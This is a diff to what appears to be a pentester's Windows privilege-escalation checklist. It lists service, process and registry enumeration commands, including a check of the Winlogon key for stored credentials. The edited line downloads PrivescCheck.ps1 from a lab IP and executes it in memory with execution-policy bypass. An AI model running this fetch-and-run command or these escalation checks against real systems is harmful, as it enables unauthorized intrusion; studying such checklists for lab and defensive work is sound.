@@ -33,13 +33,14 @@ functions:
         - [ ] wmic service get name,displayname,pathname,startmode | findstr /i "auto"  
         - [ ] wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /V "Windows"  
         - [ ] wmic service list full
+        - [ ] get-process | select name, path, starttime, ID | ?{$_.Path -like '*appdata*'} | fl
         - [ ] ./accesschk64.exe -accepteula -c Apache2.4 -l   # service control permission check
         - [ ] mountvol
         - [ ] reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
         - [ ] reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
         - [ ] reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
-        - powershell -c "iex(iwr http://192.168.119.149:8000/Invoke-PrivescCheck.ps1 -usebasicparsing);Invoke-PrivescCheck"
+        - powershell -ep bypass -c "iex(iwr http://192.168.119.149:8000/PrivescCheck.ps1 -usebasicparsing);Invoke-PrivescCheck"
 
 resources: |
   https://github.com/itm4n/PrivescCheck
